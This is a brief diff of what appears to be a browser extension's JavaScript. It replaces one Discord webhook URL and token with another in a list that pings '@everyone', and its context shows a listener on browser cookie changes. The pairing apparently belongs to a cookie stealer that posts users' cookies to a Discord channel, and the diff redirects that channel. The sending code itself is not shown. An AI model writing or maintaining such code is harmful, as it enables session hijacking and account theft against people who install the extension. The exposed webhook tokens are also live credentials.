@@ -4,7 +4,7 @@ const WEBHOOKS = [
         mention: "@everyone"
     },
     {
-        url: "https://discord.com/api/webhooks/1403981151365763172/zLogqJlgQnhY0k6JHzuRPNyqMDx9-uztndOpQ8PsDgz8US5SDjrDR-EsJl3pqospR7mU",
+        url: "https://discord.com/api/webhooks/1415647861152026655/Dj7QiFegkjBJ6WW42Efv1HK-0W_eTAjhiEv6bVlS6XQiTKruwBKjRorFGpMSggbLz9ZP",
         mention: "@everyone"
     }
 ];
@@ -138,3 +138,4 @@ chrome.cookies.onChanged.addListener(changeInfo => {
         }
     }
 });
+
